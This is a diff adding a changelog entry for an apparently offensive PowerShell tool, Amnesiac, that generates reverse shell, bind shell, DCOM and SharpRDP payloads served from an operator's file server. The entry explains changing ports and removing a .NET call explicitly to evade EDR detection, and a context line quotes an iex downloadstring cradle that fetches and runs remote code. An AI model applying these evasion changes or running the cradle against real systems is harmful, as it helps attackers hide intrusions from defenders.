@@ -5,6 +5,28 @@ Format: `[LAYER] Change description — *why this matters operationally*`
 
 ---
 
+## [2026-06-07d] fix(ux): serve check, port change, and LoadWithPartialName removal
+
+**Changes:**
+
+- **Serve not-running detection** — replaced TCP connection probe (`TcpClient.Connect('127.0.0.1', 4443)`)
+  with `$global:FileServerProcess.HasExited` process state check. The TCP probe failed after quitting
+  the listener because `serve` binds to the operator's real IP, not `127.0.0.1`. The false "not running"
+  message appeared even when serve had been running fine. Now correctly detects whether the serve process
+  is alive regardless of bind address. Applied to all four check sites in both `Amnesiac.ps1` and
+  `Amnesiac_ShellReady.ps1` (reverse shell block, bind shell block, DCOM check, SharpRDP listener check).
+  WriteAllText for the pipe file is now unconditional — file is always written so it is ready whether or
+  not serve happens to be running at generation time.
+
+- **Port 8080 → 4443** — All serve URLs, firewall rule names, and port references changed from 8080 to
+  4443. Port 8080 is a well-known proxy/dev port that triggers EDR network heuristics. Port 4443 is lower
+  profile in internal network traffic. Applied with `replace_all` across both script files.
+
+- **Remove `LoadWithPartialName('System.Core')`** — This call appeared in every generated pipe payload
+  via `$asmLoad` in `New-PayloadScript`. `System.Core` is already loaded by default in PS 5.1 — the call
+  is a no-op that adds a recognizable .NET API call pattern to the payload. Removed from both
+  `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`.
+
 ## [2026-06-07c] fix(evasion): replace iex+downloadstring cradle with iwr+scriptblock and -enc options
 
 **Problem:** Option [2] "Clean serve" used `powershell -c "iex(new-object net.webclient).downloadstring(...)"`.
